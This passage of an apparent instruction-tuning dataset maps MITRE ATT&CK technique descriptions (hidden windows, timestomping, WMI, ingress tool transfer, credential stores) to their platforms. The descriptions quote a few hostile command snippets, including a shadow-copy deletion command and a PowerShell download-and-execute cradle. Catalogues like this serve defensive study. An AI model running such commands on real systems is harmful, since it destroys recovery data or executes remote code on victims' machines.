      "answer": "The provided description is related to MITRE technique Web Service (T1102);\nTechnique Web Service (T1102) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Encoding: Standard Encoding (T1132.001);\nTechnique Data Encoding: Standard Encoding (T1132.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.",
      "answer": "The provided description is related to MITRE technique Data Encoding: Standard Encoding (T1132.001);\nTechnique Data Encoding: Standard Encoding (T1132.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.",
    "context": "",
    "output": "The provided description is related to MITRE technique Hide Artifacts: Hidden Window (T1564.003);\nTechnique Hide Artifacts: Hidden Window (T1564.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.",
      "answer": "The provided description is related to MITRE technique Hide Artifacts: Hidden Window (T1564.003);\nTechnique Hide Artifacts: Hidden Window (T1564.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: Timestomp (T1070.006);\nTechnique Indicator Removal: Timestomp (T1070.006) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: Timestomp (T1070.006);\nTechnique Indicator Removal: Timestomp (T1070.006) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "answer": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
      "answer": "The provided description is related to MITRE technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
    "context": "",
    "output": "The provided description is related to MITRE technique Proxy: Internal Proxy (T1090.001);\nTechnique Proxy: Internal Proxy (T1090.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
      "answer": "The provided description is related to MITRE technique Proxy: Internal Proxy (T1090.001);\nTechnique Proxy: Internal Proxy (T1090.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., Hijack Execution Flow), an adversary can use LSA operations to continuously execute malicious payloads.",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: LSASS Driver (T1547.008);\nTechnique Boot or Logon Autostart Execution: LSASS Driver (T1547.008) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., Hijack Execution Flow), an adversary can use LSA operations to continuously execute malicious payloads.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: LSASS Driver (T1547.008);\nTechnique Boot or Logon Autostart Execution: LSASS Driver (T1547.008) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003);\nTechnique Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",
      "answer": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003);\nTechnique Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.",
    "context": "",
    "output": "The provided description is related to MITRE technique Windows Management Instrumentation (T1047);\nTechnique Windows Management Instrumentation (T1047) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.",
      "answer": "The provided description is related to MITRE technique Windows Management Instrumentation (T1047);\nTechnique Windows Management Instrumentation (T1047) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
    "context": "",
    "output": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "answer": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
